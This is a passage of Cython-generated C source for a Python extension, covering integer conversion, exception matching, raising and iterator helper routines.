PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {\n                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 3:\n                    if ((8 * sizeof(long) > 2 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {\n                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case -4:\n                    if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) - 1 > 4 * PyLong_SHIFT)) {\n                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n                case 4:\n                    if ((8 * sizeof(long) > 3 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(long) - 1 > 4 * PyLong_SHIFT)) {\n                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));\n                        }\n                    }\n                    break;\n            }\n        }\n#endif\n        if ((sizeof(long) <= sizeof(long))) {\n            __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n        } else if ((sizeof(long) <= sizeof(PY_LONG_LONG))) {\n            __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n        }\n    }\n    {\n        long val;\n        int ret = -1;\n#if PY_VERSION_HEX >= 0x030d00A6 && !CYTHON_COMPILING_IN_LIMITED_API\n        Py_ssize_t bytes_copied = PyLong_AsNativeBytes(\n            x, &val, sizeof(val), Py_ASNATIVEBYTES_NATIVE_ENDIAN | (is_unsigned ? Py_ASNATIVEBYTES_UNSIGNED_BUFFER | Py_ASNATIVEBYTES_REJECT_NEGATIVE : 0));\n        if (unlikely(bytes_copied == -1)) {\n        } else if (unlikely(bytes_copied > (Py_ssize_t) sizeof(val))) {\n            goto raise_overflow;\n        } else {\n            ret = 0;\n        }\n#elif PY_VERSION_HEX < 0x030d0000 && !(CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API) || defined(_PyLong_AsByteArray)\n        int one = 1; int is_little = (int)*(unsigned char *)&one;\n        unsigned char *bytes = (unsigned char *)&val;\n        ret = _PyLong_AsByteArray((PyLongObject *)x,\n                                    bytes, sizeof(val),\n                                    is_little, !is_unsigned);\n#else\n        PyObject *v;\n        PyObject *stepval = NULL, *mask = NULL, *shift = NULL;\n        int bits, remaining_bits, is_negative = 0;\n        int chunk_size = (sizeof(long) < 8) ? 30 : 62;\n        if (likely(PyLong_CheckExact(x))) {\n            v = __Pyx_NewRef(x);\n        } else {\n            v = PyNumber_Long(x);\n            if (unlikely(!v)) return (long) -1;\n            assert(PyLong_CheckExact(v));\n        }\n        {\n            int result = PyObject_RichCompareBool(v, Py_False, Py_LT);\n            if (unlikely(result < 0)) {\n                Py_DECREF(v);\n                return (long) -1;\n            }\n            is_negative = result == 1;\n        }\n        if (is_unsigned && unlikely(is_negative)) {\n            Py_DECREF(v);\n            goto raise_neg_overflow;\n        } else if (is_negative) {\n            stepval = PyNumber_Invert(v);\n            Py_DECREF(v);\n            if (unlikely(!stepval))\n                return (long) -1;\n        } else {\n            stepval = v;\n        }\n        v = NULL;\n        val = (long) 0;\n        mask = PyLong_FromLong((1L << chunk_size) - 1); if (unlikely(!mask)) goto done;\n        shift = PyLong_FromLong(chunk_size); if (unlikely(!shift)) goto done;\n        for (bits = 0; bits < (int) sizeof(long) * 8 - chunk_size; bits += chunk_size) {\n            PyObject *tmp, *digit;\n            long idigit;\n            digit = PyNumber_And(stepval, mask);\n            if (unlikely(!digit)) goto done;\n            idigit = PyLong_AsLong(digit);\n            Py_DECREF(digit);\n            if (unlikely(idigit < 0)) goto done;\n            val |= ((long) idigit) << bits;\n            tmp = PyNumber_Rshift(stepval, shift);\n            if (unlikely(!tmp)) goto done;\n            Py_DECREF(stepval); stepval = tmp;\n        }\n        Py_DECREF(shift); shift = NULL;\n        Py_DECREF(mask); mask = NULL;\n        {\n            long idigit = PyLong_AsLong(stepval);\n            if (unlikely(idigit < 0)) goto done;\n            remaining_bits = ((int) sizeof(long) * 8) - bits - (is_unsigned ? 0 : 1);\n            if (unlikely(idigit >= (1L << remaining_bits)))\n                goto raise_overflow;\n            val |= ((long) idigit) << bits;\n        }\n        if (!is_unsigned) {\n            if (unlikely(val & (((long) 1) << (sizeof(long) * 8 - 1))))\n                goto raise_overflow;\n            if (is_negative)\n                val = ~val;\n        }\n        ret = 0;\n    done:\n        Py_XDECREF(shift);\n        Py_XDECREF(mask);\n        Py_XDECREF(stepval);\n#endif\n        if (unlikely(ret))\n            return (long) -1;\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        "value too large to convert to long");\n    return (long) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        "can\'t convert negative value to long");\n    return (long) -1;\n}\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x030d0000\nstatic __Pyx_TypeName\n__Pyx_PyType_GetFullyQualifiedName(PyTypeObject* tp)\n{\n    PyObject *module = NULL, *name = NULL, *result = NULL;\n    #if __PYX_LIMITED_VERSION_HEX < 0x030b0000\n    name = __Pyx_PyObject_GetAttrStr((PyObject *)tp,\n                                               __pyx_mstate_global->__pyx_n_u_qualname);\n    #else\n    name = PyType_GetQualName(tp);\n    #endif\n    if (unlikely(name == NULL) || unlikely(!PyUnicode_Check(name))) goto bad;\n    module = __Pyx_PyObject_GetAttrStr((PyObject *)tp,\n                                               __pyx_mstate_global->__pyx_n_u_module);\n    if (unlikely(module == NULL) || unlikely(!PyUnicode_Check(module))) goto bad;\n    if (PyUnicode_CompareWithASCIIString(module, "builtins") == 0) {\n        result = name;\n        name = NULL;\n        goto done;\n    }\n    result = PyUnicode_FromFormat("%U.%U", module, name);\n    if (unlikely(result == NULL)) goto bad;\n  done:\n    Py_XDECREF(name);\n    Py_XDECREF(module);\n    return result;\n  bad:\n    PyErr_Clear();\n    if (name) {\n        result = name;\n        name = NULL;\n    } else {\n        result = __Pyx_NewRef(__pyx_mstate_global->__pyx_kp_u__17);\n    }\n    goto done;\n}\n#endif\n\n\nstatic CYTHON_INLINE int __Pyx_PyLong_As_int(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored "-Wconversion"\n#endif\n    const int neg_one = (int) -1, const_zero = (int) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n    if (unlikely(!PyLong_Check(x))) {\n        int val;\n        PyObject *tmp = __Pyx_PyNumber_Long(x);\n        if (!tmp) return (int) -1;\n        val = __Pyx_PyLong_As_int(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\n    if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n        if (unlikely(__Pyx_PyLong_IsNeg(x))) {\n            goto raise_neg_overflow;\n        } else if (__Pyx_PyLong_IsCompact(x)) {\n            __PYX_VERIFY_RETURN_INT(int, __Pyx_compact_upylong, __Pyx_PyLong_CompactValueUnsigned(x))\n        } else {\n            const digit* digits = __Pyx_PyLong_Digits(x);\n            assert(__Pyx_PyLong_DigitCount(x) > 1);\n            switch (__Pyx_PyLong_DigitCount(x)) {\n                case 2:\n                    if ((8 * sizeof(int) > 1 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) >= 2 * PyLong_SHIFT)) {\n                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n                case 3:\n                    if ((8 * sizeof(int) > 2 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) >= 3 * PyLong_SHIFT)) {\n                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n                case 4:\n                    if ((8 * sizeof(int) > 3 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) >= 4 * PyLong_SHIFT)) {\n                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n            }\n        }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A7\n        if (unlikely(Py_SIZE(x) < 0)) {\n            goto raise_neg_overflow;\n        }\n#else\n        {\n            int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n            if (unlikely(result < 0))\n                return (int) -1;\n            if (unlikely(result == 1))\n                goto raise_neg_overflow;\n        }\n#endif\n        if ((sizeof(int) <= sizeof(unsigned long))) {\n            __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n        } else if ((sizeof(int) <= sizeof(unsigned PY_LONG_LONG))) {\n            __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n        }\n    } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n        if (__Pyx_PyLong_IsCompact(x)) {\n            __PYX_VERIFY_RETURN_INT(int, __Pyx_compact_pylong, __Pyx_PyLong_CompactValue(x))\n        } else {\n            const digit* digits = __Pyx_PyLong_Digits(x);\n            assert(__Pyx_PyLong_DigitCount(x) > 1);\n            switch (__Pyx_PyLong_SignedDigitCount(x)) {\n                case -2:\n                    if ((8 * sizeof(int) - 1 > 1 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {\n                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 2:\n                    if ((8 * sizeof(int) > 1 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {\n                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case -3:\n                    if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {\n                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 3:\n                    if ((8 * sizeof(int) > 2 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {\n                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case -4:\n                    if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) - 1 > 4 * PyLong_SHIFT)) {\n                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 4:\n                    if ((8 * sizeof(int) > 3 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) - 1 > 4 * PyLong_SHIFT)) {\n                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n            }\n        }\n#endif\n        if ((sizeof(int) <= sizeof(long))) {\n            __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n        } else if ((sizeof(int) <= sizeof(PY_LONG_LONG))) {\n            __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n        }\n    }\n    {\n        int val;\n        int ret = -1;\n#if PY_VERSION_HEX >= 0x030d00A6 && !CYTHON_COMPILING_IN_LIMITED_API\n        Py_ssize_t bytes_copied = PyLong_AsNativeBytes(\n            x, &val, sizeof(val), Py_ASNATIVEBYTES_NATIVE_ENDIAN | (is_unsigned ? Py_ASNATIVEBYTES_UNSIGNED_BUFFER | Py_ASNATIVEBYTES_REJECT_NEGATIVE : 0));\n        if (unlikely(bytes_copied == -1)) {\n        } else if (unlikely(bytes_copied > (Py_ssize_t) sizeof(val))) {\n            goto raise_overflow;\n        } else {\n            ret = 0;\n        }\n#elif PY_VERSION_HEX < 0x030d0000 && !(CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API) || defined(_PyLong_AsByteArray)\n        int one = 1; int is_little = (int)*(unsigned char *)&one;\n        unsigned char *bytes = (unsigned char *)&val;\n        ret = _PyLong_AsByteArray((PyLongObject *)x,\n                                    bytes, sizeof(val),\n                                    is_little, !is_unsigned);\n#else\n        PyObject *v;\n        PyObject *stepval = NULL, *mask = NULL, *shift = NULL;\n        int bits, remaining_bits, is_negative = 0;\n        int chunk_size = (sizeof(long) < 8) ? 30 : 62;\n        if (likely(PyLong_CheckExact(x))) {\n            v = __Pyx_NewRef(x);\n        } else {\n            v = PyNumber_Long(x);\n            if (unlikely(!v)) return (int) -1;\n            assert(PyLong_CheckExact(v));\n        }\n        {\n            int result = PyObject_RichCompareBool(v, Py_False, Py_LT);\n            if (unlikely(result < 0)) {\n                Py_DECREF(v);\n                return (int) -1;\n            }\n            is_negative = result == 1;\n        }\n        if (is_unsigned && unlikely(is_negative)) {\n            Py_DECREF(v);\n            goto raise_neg_overflow;\n        } else if (is_negative) {\n            stepval = PyNumber_Invert(v);\n            Py_DECREF(v);\n            if (unlikely(!stepval))\n                return (int) -1;\n        } else {\n            stepval = v;\n        }\n        v = NULL;\n        val = (int) 0;\n        mask = PyLong_FromLong((1L << chunk_size) - 1); if (unlikely(!mask)) goto done;\n        shift = PyLong_FromLong(chunk_size); if (unlikely(!shift)) goto done;\n        for (bits = 0; bits < (int) sizeof(int) * 8 - chunk_size; bits += chunk_size) {\n            PyObject *tmp, *digit;\n            long idigit;\n            digit = PyNumber_And(stepval, mask);\n            if (unlikely(!digit)) goto done;\n            idigit = PyLong_AsLong(digit);\n            Py_DECREF(digit);\n            if (unlikely(idigit < 0)) goto done;\n            val |= ((int) idigit) << bits;\n            tmp = PyNumber_Rshift(stepval, shift);\n            if (unlikely(!tmp)) goto done;\n            Py_DECREF(stepval); stepval = tmp;\n        }\n        Py_DECREF(shift); shift = NULL;\n        Py_DECREF(mask); mask = NULL;\n        {\n            long idigit = PyLong_AsLong(stepval);\n            if (unlikely(idigit < 0)) goto done;\n            remaining_bits = ((int) sizeof(int) * 8) - bits - (is_unsigned ? 0 : 1);\n            if (unlikely(idigit >= (1L << remaining_bits)))\n                goto raise_overflow;\n            val |= ((int) idigit) << bits;\n        }\n        if (!is_unsigned) {\n            if (unlikely(val & (((int) 1) << (sizeof(int) * 8 - 1))))\n                goto raise_overflow;\n            if (is_negative)\n                val = ~val;\n        }\n        ret = 0;\n    done:\n        Py_XDECREF(shift);\n        Py_XDECREF(mask);\n        Py_XDECREF(stepval);\n#endif\n        if (unlikely(ret))\n            return (int) -1;\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        "value too large to convert to int");\n    return (int) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        "can\'t convert negative value to int");\n    return (int) -1;\n}\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {\n    while (a) {\n        a = __Pyx_PyType_GetSlot(a, tp_base, PyTypeObject*);\n        if (a == b)\n            return 1;\n    }\n    return b == &PyBaseObject_Type;\n}\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {\n    PyObject *mro;\n    if (a == b) return 1;\n    mro = a->tp_mro;\n    if (likely(mro)) {\n        Py_ssize_t i, n;\n        n = PyTuple_GET_SIZE(mro);\n        for (i = 0; i < n; i++) {\n            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)\n                return 1;\n        }\n        return 0;\n    }\n    return __Pyx_InBases(a, b);\n}\nstatic CYTHON_INLINE int __Pyx_IsAnySubtype2(PyTypeObject *cls, PyTypeObject *a, PyTypeObject *b) {\n    PyObject *mro;\n    if (cls == a || cls == b) return 1;\n    mro = cls->tp_mro;\n    if (likely(mro)) {\n        Py_ssize_t i, n;\n        n = PyTuple_GET_SIZE(mro);\n        for (i = 0; i < n; i++) {\n            PyObject *base = PyTuple_GET_ITEM(mro, i);\n            if (base == (PyObject *)a || base == (PyObject *)b)\n                return 1;\n        }\n        return 0;\n    }\n    return __Pyx_InBases(cls, a) || __Pyx_InBases(cls, b);\n}\nstatic CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {\n    if (exc_type1) {\n        return __Pyx_IsAnySubtype2((PyTypeObject*)err, (PyTypeObject*)exc_type1, (PyTypeObject*)exc_type2);\n    } else {\n        return __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);\n    }\n}\nstatic int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\n    Py_ssize_t i, n;\n    assert(PyExceptionClass_Check(exc_type));\n    n = PyTuple_GET_SIZE(tuple);\n    for (i=0; i<n; i++) {\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\n    }\n    for (i=0; i<n; i++) {\n        PyObject *t = PyTuple_GET_ITEM(tuple, i);\n        if (likely(PyExceptionClass_Check(t))) {\n            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;\n        } else {\n        }\n    }\n    return 0;\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {\n    if (likely(err == exc_type)) return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        if (likely(PyExceptionClass_Check(exc_type))) {\n            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);\n        } else if (likely(PyTuple_Check(exc_type))) {\n            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);\n        } else {\n        }\n    }\n    return PyErr_GivenExceptionMatches(err, exc_type);\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {\n    assert(PyExceptionClass_Check(exc_type1));\n    assert(PyExceptionClass_Check(exc_type2));\n    if (likely(err == exc_type1 || err == exc_type2)) return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);\n    }\n    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));\n}\n#endif\n\n\nstatic void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause) {\n    PyObject* owned_instance = NULL;\n    if (tb == Py_None) {\n        tb = 0;\n    } else if (tb && !PyTraceBack_Check(tb)) {\n        PyErr_SetString(PyExc_TypeError,\n            "raise: arg 3 must be a traceback or None");\n        goto bad;\n    }\n    if (value == Py_None)\n        value = 0;\n    if (PyExceptionInstance_Check(type)) {\n        if (value) {\n            PyErr_SetString(PyExc_TypeError,\n                "instance exception may not have a separate value");\n            goto bad;\n        }\n        value = type;\n        type = (PyObject*) Py_TYPE(value);\n    } else if (PyExceptionClass_Check(type)) {\n        PyObject *instance_class = NULL;\n        if (value && PyExceptionInstance_Check(value)) {\n            instance_class = (PyObject*) Py_TYPE(value);\n            if (instance_class != type) {\n                int is_subclass = PyObject_IsSubclass(instance_class, type);\n                if (!is_subclass) {\n                    instance_class = NULL;\n                } else if (unlikely(is_subclass == -1)) {\n                    goto bad;\n                } else {\n                    type = instance_class;\n                }\n            }\n        }\n        if (!instance_class) {\n            PyObject *args;\n            if (!value)\n                args = PyTuple_New(0);\n            else if (PyTuple_Check(value)) {\n                Py_INCREF(value);\n                args = value;\n            } else\n                args = PyTuple_Pack(1, value);\n            if (!args)\n                goto bad;\n            owned_instance = PyObject_Call(type, args, NULL);\n            Py_DECREF(args);\n            if (!owned_instance)\n                goto bad;\n            value = owned_instance;\n            if (!PyExceptionInstance_Check(value)) {\n                PyErr_Format(PyExc_TypeError,\n                             "calling %R should have returned an instance of "\n                             "BaseException, not %R",\n                             type, Py_TYPE(value));\n                goto bad;\n            }\n        }\n    } else {\n        PyErr_SetString(PyExc_TypeError,\n            "raise: exception class must be a subclass of BaseException");\n        goto bad;\n    }\n    if (cause) {\n        PyObject *fixed_cause;\n        if (cause == Py_None) {\n            fixed_cause = NULL;\n        } else if (PyExceptionClass_Check(cause)) {\n            fixed_cause = PyObject_CallObject(cause, NULL);\n            if (fixed_cause == NULL)\n                goto bad;\n        } else if (PyExceptionInstance_Check(cause)) {\n            fixed_cause = cause;\n            Py_INCREF(fixed_cause);\n        } else {\n            PyErr_SetString(PyExc_TypeError,\n                            "exception causes must derive from "\n                            "BaseException");\n            goto bad;\n        }\n        PyException_SetCause(value, fixed_cause);\n    }\n    PyErr_SetObject(type, value);\n    if (tb) {\n#if PY_VERSION_HEX >= 0x030C00A6\n        PyException_SetTraceback(value, tb);\n#elif CYTHON_FAST_THREAD_STATE\n        PyThreadState *tstate = __Pyx_PyThreadState_Current;\n        PyObject* tmp_tb = tstate->curexc_traceback;\n        if (tb != tmp_tb) {\n            Py_INCREF(tb);\n            tstate->curexc_traceback = tb;\n            Py_XDECREF(tmp_tb);\n        }\n#else\n        PyObject *tmp_type, *tmp_value, *tmp_tb;\n        PyErr_Fetch(&tmp_type, &tmp_value, &tmp_tb);\n        Py_INCREF(tb);\n        PyErr_Restore(tmp_type, tmp_value, tb);\n        Py_XDECREF(tmp_tb);\n#endif\n    }\nbad:\n    Py_XDECREF(owned_instance);\n    return;\n}\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x030A0000\nstatic PyObject *__Pyx_GetBuiltinNext_LimitedAPI(void) {\n    if (unlikely(!__pyx_mstate_global->__Pyx_GetBuiltinNext_LimitedAPI_cache))\n        __pyx_mstate_global->__Pyx_GetBuiltinNext_LimitedAPI_cache = __Pyx_GetBuiltinName(__pyx_mstate_global->__pyx_n_u_next);\n    return __pyx_mstate_global->__Pyx_GetBuiltinNext_LimitedAPI_cache;\n}\n#endif\nstatic CYTHON_INLINE PyObject *__Pyx_PyIter_Next_Plain(PyObject *iterator) {\n#if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x030A0000\n    PyObject *result;\n    PyObject *next = __Pyx_GetBuiltinNext_LimitedAPI();\n    if (unlikely(!next)) return NULL;\n    result = PyObject_CallFunctionObjArgs(next, iterator, NULL);\n    return result;\n#else\n    (void)__Pyx_GetBuiltinName; // only for early limited API\n    iternextfunc iternext = __Pyx_PyObject_GetIterNextFunc(iterator);\n    assert(iternext);\n    return iternext(iterator);\n#endif\n}\n\n\nstatic void __Pyx__ReturnWithStopIteration(PyObject* value, int async);\nstatic CYTHON_INLINE void __Pyx_ReturnWithStopIteration(PyObject* value, int async, int iternext) {\n    if (value == Py_None) {\n        if (async || !iternext)\n            PyErr_SetNone(async ? PyExc_StopAsyncIteration : PyExc_StopIteration);\n        return;\n    }\n    __Pyx__ReturnWithStopIteration(value, async);\n}\nstatic void __Pyx__ReturnWithStopIteration(PyObject* value, int async) {\n#if CYTHON_COMPILING_IN_CPYTHON\n    __Pyx_PyThreadState_declare\n#endif\n    PyObject *exc;\n    PyObject *exc_type = async ? PyExc_StopAsyncIteration : PyExc_StopIteration;\n#if CYTHON_COMPILING_IN_CPYTHON\n    if ((PY_VERSION_HEX >= (0x030C00A6)) || unlikely(PyTuple_Check(value) || PyExceptionInstance_Check(value))) {\n        if (PY_VERSION_HEX >= (0x030e00A1)) {\n            exc = __Pyx_PyObject_CallOneArg(exc_type, value);\n        } else {\n            PyObject *args_tuple = PyTuple_New(1);\n            if (unlikely(!args_tuple)) return;\n            Py_INCREF(value);\n            PyTuple_SET_ITEM(args_tuple, 0, value);\n            exc = PyObject_Call(exc_type, args_tuple, NULL);\n            Py_DECREF(args_tuple);\n        }\n        if (unlikely(!exc)) return;\n    } else {\n        Py_INCREF(value);\n        exc = value;\n    }\n    #if CYTHON_FAST_THREAD_STATE\n    __Pyx_PyThreadState_assign\n    #if CYTHON_USE_EXC_INFO_STACK\n    if (!__pyx_tstate->exc_info->exc_value)\n    #else\n    if (!__pyx_tstate->exc_type)\n    #endif\n    {\n        Py_INCREF(exc_type);\n        __Pyx_ErrRestore(exc_type, exc, NULL);\n        return;\n    }\n    #endif\n#else\n    exc = __Pyx_PyObject_CallOneArg(exc_type, value);\n    if (unlikely(!exc)) return;\n#endif\n    PyErr_SetObject(exc_type, exc);\n    Py_DECREF(exc);\n}\n\n\n#if !CYTHON_COMPILING_IN_LIMITED_API\n#include <frameobject.h>\n#if PY_VERSION_HEX >= 0x030b00a6 && !defined(PYPY_VERSION)\n  #ifndef Py_BUILD_CORE\n    #define Py_BUILD_CORE 1\n  #endif\n  #include "internal/pycore_frame.h"\n#endif\n#endif // CYTHON_COMPILING_IN_LIMITED_API\nstatic CYTHON_INLINE void\n__Pyx_Coroutine_Undelegate(__pyx_CoroutineObject *gen) {\n#if CYTHON_USE_AM_SEND\n    gen->yieldfrom_am_send = NULL;\n#endif\n    Py_CLEAR(gen->yieldfrom);\n}\nstatic int __Pyx_PyGen__FetchStopIterationValue(PyThreadState *__pyx_tstate, PyObject **pvalue) {\n    PyObject *et, *ev, 